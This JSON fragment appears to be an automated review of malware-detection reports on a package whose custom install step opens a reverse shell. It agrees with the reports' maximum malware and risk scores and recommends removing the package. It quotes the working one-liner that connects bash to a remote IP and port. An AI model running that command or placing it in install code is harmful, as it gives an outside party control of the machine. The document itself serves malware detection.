  "review": "Let's analyze the reports carefully, step-by-step, to determine the accuracy of their assessments and the appropriateness of their scores.\n\n**1. Presence of Issues in the Code:**\n- All reports correctly identify that the code contains a `os.system` call executing a reverse shell command during the custom install process.\n- The code indeed executes: `os.system(\"bash -c 'bash -i >& /dev/tcp/114.116.119.253/7777 <&1'\")` after the standard installation.\n\n**2. Errors, Flaws, or Mistakes in the Reports:**\n- The reports are consistent and accurate in their description. They correctly identify the malicious intent and the suspicious nature of executing a reverse shell during package installation.\n- No factual inaccuracies or logical flaws are apparent. They correctly interpret the code's behavior.\n\n**3. Scores Given to Each Issue:**\n- All reports assign:\n  - `confidence`: 0.9 or 1\n  - `obfuscated`: 0\n  - `malware`: 1\n  - `securityRisk`: 1\n- These scores seem reasonable given the clear malicious behavior.\n- Since the malicious activity is explicit and unambiguous, a malware score of 1 and security risk of 1 are justified.\n- Confidence levels are high, reflecting the certainty of malicious activity.\n\n**4. Justification for Risk Scores Higher Than 0.5:**\n- The reverse shell connection is a serious security threat, allowing remote control of the host system.\n- The behavior is clearly malicious, not speculative.\n- Therefore, scores of 1 for malware and security risk are justified.\n\n**5. Malware Score Reflection:**\n- The code executes a reverse shell, which is malicious activity.\n- The reports correctly assign a malware score of 1.\n- No obfuscation is present, so obfuscated score remains 0.\n\n**6. Claims Based on Assumptions:**\n- All reports base their conclusions on the actual code present, not assumptions.\n- The malicious command is explicit and directly observable.\n\n**7. Consistency of Scores:**\n- The scores are consistent with the described behavior.\n- High confidence and malware scores align with the evidence.\n\n---\n\n### Final Assessment:\n\n**Malware Score:** 1  \n**Obfuscated Score:** 0  \n**Risk Score:** 1\n\n**Rationale:**\n- The code explicitly executes a reverse shell, a well-known malicious activity.\n- The malicious code is not obfuscated.\n- The behavior during installation poses a severe security threat, justifying maximum risk scores.\n\n---\n\n### Summary:\nThe reports are accurate and appropriately score the malicious activity. The code is clearly dangerous, and the scores reflect that severity. No adjustments are necessary.\n\n**Final recommendation:**  \n- **Malware:** 1  \n- **Obfuscated:** 0  \n- **Risk:** 1\n\nThis package should be flagged as malicious and removed from any repositories or distributions.",
